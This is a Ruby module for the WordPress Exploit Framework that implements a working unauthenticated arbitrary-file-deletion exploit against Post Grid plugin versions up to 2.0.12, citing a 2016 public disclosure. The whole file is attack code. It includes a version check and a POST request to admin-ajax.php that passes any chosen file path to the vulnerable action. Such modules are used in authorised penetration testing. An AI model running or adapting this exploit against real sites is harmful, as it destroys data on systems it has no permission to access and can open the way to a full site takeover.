# frozen_string_literal: true

class Wpxf::Auxiliary::PostGridFileDeletion < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Post Grid <= 2.0.12 Unauthenticated Arbitrary File Deletion',
      desc: 'This module exploits a vulnerability in versions <= 2.0.12 of '\
            'the Post Grid plugin which allows you to delete any arbitrary '\
            'file accessible by the user the web server is running as.',
      author: [
        'White Fir Design', # Disclosure
        'rastating'         # WPXF module
      ],
      references: [
        ['WPVDB', '8667'],
        ['URL', 'https://www.pluginvulnerabilities.com/2016/11/08/file-deletion-vulnerability-in-post-grid/']
      ],
      date: 'Nov 08 2016'
    )

    register_options([
      StringOption.new(
        name: 'remote_file',
        desc: 'The relative or absolute path of the file to delete (relative to /wp-admin/)',
        required: true
      )
    ])
  end

  def check
    check_plugin_version_from_readme('post-grid', '2.0.13')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def run
    return false unless super

    emit_info "Deleting #{remote_file}..."
    res = execute_post_request(
      url: wordpress_url_admin_ajax,
      body: {
        action: 'post_grid_ajax_remove_export_content_layout',
        file_url: remote_file
      }
    )

    if res.nil? || res.timed_out?
      emit_error 'Request timed out'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    emit_success 'File deleted'
    true
  end
end
